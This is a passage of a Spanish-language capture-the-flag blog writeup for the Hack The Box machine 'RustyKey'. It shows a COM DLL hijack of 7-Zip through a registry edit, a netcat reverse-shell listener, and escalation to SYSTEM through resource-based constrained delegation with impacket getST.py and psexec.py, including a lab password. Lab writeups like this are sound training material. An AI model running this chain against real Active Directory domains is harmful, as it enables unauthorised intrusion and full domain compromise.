+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\</span><span class="n">CLSID</span><span class="p">\{</span><span class="n">23170F69</span><span class="p">-</span><span class="n">40C1</span><span class="p">-</span><span class="n">278A</span><span class="p">-</span><span class="mf">1000</span><span class="p">-</span><span class="mf">000100020000</span><span class="p">}\</span><span class="n">InprocServer32</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">malicious</span><span class="p">.</span><span class="py">dll</span>
+</span></span></code></pre></div><p>Una vez cambiado el registro, nos abriremos un puerto con <code>nc</code> para esperar a obtener la shell del usuario victima para cuando vaya a usar el programa 7-zip.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">Connection from 10.10.11.75:53054
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.7434<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">rustykey<span class="se">\m</span>m.turner
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Una vez habiendo obtenido una shell como <code>mm.turner</code>, mirando el bloodhound vemos que el único Domain admin es administrator pero exite otra cuenta con permisos de administrador llamada <code>backupadmin</code>.</p>
+<p><img alt="Rustykey Machine 5" loading="lazy" src="/img/rustykey/rustykey_machine_5.png"></p>
+<h2 id="abusing-addallowedtoact---resource-based-constrained-delegation">Abusing AddAllowedToAct - Resource-Based Constrained Delegation<a hidden class="anchor" aria-hidden="true" href="#abusing-addallowedtoact---resource-based-constrained-delegation">#</a></h2>
+<p><img alt="Rustykey Machine 6" loading="lazy" src="/img/rustykey/rustykey_machine_6.png"></p>
+<p><code>Resource Based Constrained Delegation</code> nos da permisos para establecer en el objeto quien puede suplantar (impersonate) cualquier usuario contra el (objeto).</p>
+<p>Para que este caso se de, el objecto restringido (constrained) tiene que tener el atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> junto con el nombre del usuario que puede suplantar.</p>
+<ul>
+<li>
+<p>Primero como atacantes necesitamos comprometer una cuenta que tenga el <code>SPN</code> o crear una en el caso de que la <code>MAQ</code> (MachineAccountQuota) no sea igual a 0, ya que eso quiere decir que no tenemos la capacidad de crear ninguna cuenta para una máquina.</p>
+</li>
+<li>
+<p>Una vez con la cuenta creada o comprometida, necesitamos escribir en los privilegios de la máquina victima para configurar el Resource-based Constrained Delegation y así permitirnos suplantar cualquier usuario contra la máquina victima.</p>
+</li>
+<li>
+<p>Ahora usando <code>impacket</code> realizamos un ataque completo <code>S4U</code> (<code>S4U2Self</code> y <code>S4U2Proxy</code>) desde la máquina comprometida a la máquina victima para obtener el usuario privilegiado con acceso a la máquina victima.</p>
+</li>
+</ul>
+<p><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html">Resource Based Constrained Delegation - HackTricks</a></p>
+<p><a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-delegation-rbcd/">Resource Based Constrained Delegation - Swisskyrepo</a></p>
+<p>Comprobamos que el <code>MachineAccountQuota</code> esta a <code>0</code> con lo cual no podemos creear ninguna máquina para llevar a cabo el ataque.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-Identity</span> <span class="p">((</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">distinguishedname</span><span class="p">)</span> <span class="n">-Properties</span> <span class="nb">ms-DS</span><span class="n">-MachineAccountQuota</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADObject</span> <span class="n">-Identity</span> <span class="p">((</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">distinguishedname</span><span class="p">)</span> <span class="n">-Properties</span> <span class="nb">ms-DS</span><span class="n">-MachineAccountQuota</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DistinguishedName</span>         <span class="err">:</span> <span class="n">DC</span><span class="p">=</span><span class="n">rustykey</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="nb">ms-DS</span><span class="n">-MachineAccountQuota</span> <span class="err">:</span> <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>                      <span class="err">:</span> <span class="n">rustykey</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectClass</span>               <span class="err">:</span> <span class="n">domainDNS</span>
+</span></span><span class="line"><span class="cl"><span class="n">ObjectGUID</span>                <span class="err">:</span> <span class="n">039d5090</span><span class="p">-</span><span class="mf">607d</span><span class="p">-</span><span class="mf">4601</span><span class="p">-</span><span class="mf">9145</span><span class="p">-</span><span class="n">7efcd0380eb1</span>
+</span></span></code></pre></div><p>Para darle una solución a este problema, anteriormente habíamos comprometido el equipo IT-COMPUTER3$ con lo cual le asignamos los permisos <code>AllowedToDelegateToAccount</code> usando <code>PowerShell</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ADComputer</span> <span class="n">dc</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="nb">IT-COMPUTER3</span><span class="p">$</span>
+</span></span></code></pre></div><p>Ahora haciendo uso de la herramienta <code>getST.py</code> de <code>impacket</code> vamos a realizar el ataque S4U para solicitar un <code>service ticket (ST)</code> suplantando al usuario <code>backupadmin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ getST.py -spn <span class="s1">&#39;cifs/DC.rustykey.htb&#39;</span> -impersonate backupadmin -dc-ip 10.10.11.75 -k <span class="s1">&#39;rustykey.htb/IT-COMPUTER3$:Rusty88!&#39;</span>
+</span></span><span class="line"><span class="cl">/home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="k">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span class="line"><span class="cl">  import pkg_resources
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating backupadmin
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2self
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ klist
+</span></span><span class="line"><span class="cl">Ticket cache: FILE:/home/borhub/Workspace/HTB/RustyKey/CONTENT/backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+</span></span><span class="line"><span class="cl">Default principal: backupadmin@rustykey.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Valid starting     Expires            Service principal
+</span></span><span class="line"><span class="cl">07/07/25 06:00:24  07/07/25 06:14:43  cifs/DC.rustykey.htb@RUSTYKEY.HTB
+</span></span><span class="line"><span class="cl">	renew <span class="k">until</span> 07/07/25 20:14:43
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/RustyKey/CONTENT/backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+</span></span></code></pre></div><p>Hemos solicitado un ticket de servicio para <code>CIFS</code>, es decir, para el sistema del ficheros del sistema. Con lo cual vamos a poder acceder al DC como NT SYSTEM usando al usuario administrador backupadmin.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ psexec.py -k -no-pass <span class="s1">&#39;rustykey.htb/backupadmin@dc.rustykey.htb&#39;</span>
+</span></span><span class="line"><span class="cl">/home/borhub/Entornos-Pentesting/pentest-venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="k">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span class="line"><span class="cl">  import pkg_resources
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on dc.rustykey.htb.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file wDEwvDhk.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on dc.rustykey.htb.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service cCrO on dc.rustykey.htb.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service cCrO.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.7434<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">type</span> Desktop<span class="se">\r</span>oot.txt
+</span></span><span class="line"><span class="cl">e9e309664d09ceb1cd827c28209aa25c
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/hard/">Hard</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/ntlm-deshabilitada/">NTLM-Deshabilitada</a></li>
+      <li><a href="https://borhuub.github.io/tags/kerberoasting/">Kerberoasting</a></li>
+      <li><a href="https://borhuub.github.io/tags/timeroasting/">Timeroasting</a></li>
+      <li><a href="https://borhuub.github.io/tags/addself/">AddSelf</a></li>
+      <li><a href="https://borhuub.github.io/tags/forcechangepassword/">ForceChangePassword</a></li>
+      <li><a href="https://borhuub.github.io/tags/protectedobjects/">ProtectedObjects</a></li>
+      <li><a href="https://borhuub.github.io/tags/runascs/">RunasCs</a></li>
+      <li><a href="https://borhuub.github.io/tags/dll-hijacking/">DLL Hijacking</a></li>
+      <li><a href="https://borhuub.github.io/tags/addallowedtoact/">AddAllowedToAct</a></li>
+      <li><a href="https://borhuub.github.io/tags/resource-based-constrained-delegation/">Resource-Based Constrained Delegation</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/puppy/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Puppy</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/tombwatcher/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Tombwatcher</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
